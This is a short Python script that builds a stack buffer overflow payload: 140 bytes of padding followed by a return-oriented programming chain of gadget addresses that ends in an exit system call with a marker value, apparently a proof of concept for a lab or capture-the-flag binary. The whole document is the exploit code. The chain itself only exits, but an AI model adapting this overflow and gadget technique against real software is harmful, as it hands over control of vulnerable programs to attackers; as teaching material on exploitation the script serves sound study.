#!/usr/bin/env python

from struct import pack
 
junk = "A" * 140
 
## ROP gadgets ##
p = ''
p += pack('<I', 0x08068060) # xor eax, eax ; pop edi ; ret
p += pack('<I', 0x41414141) # junk
p += pack('<I', 0x0807b12f) # inc eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x42424242) # exit(0x42424242)
p += pack('<I', 0x08049411) # int 0x80

payload = junk + p
print payload